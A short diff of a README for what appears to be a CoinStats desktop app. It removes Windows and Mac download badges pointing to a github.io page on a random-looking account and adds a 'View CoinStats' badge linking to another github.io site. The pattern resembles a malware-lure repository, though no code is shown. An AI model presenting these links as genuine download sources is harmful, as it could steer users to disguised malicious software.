@@ -6,10 +6,7 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://freidarudyetqerk.github.io/.github/CoinStats-Desktop-App)  
-
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://freidarudyetqerk.github.io/.github/CoinStats-Desktop-App)
-</div>
+[![View CoinStats](https://img.shields.io/badge/View-CoinStats-2563EB?style=plastic)](https://portfolio-coinstats.github.io/.github/)
 
 ---
 
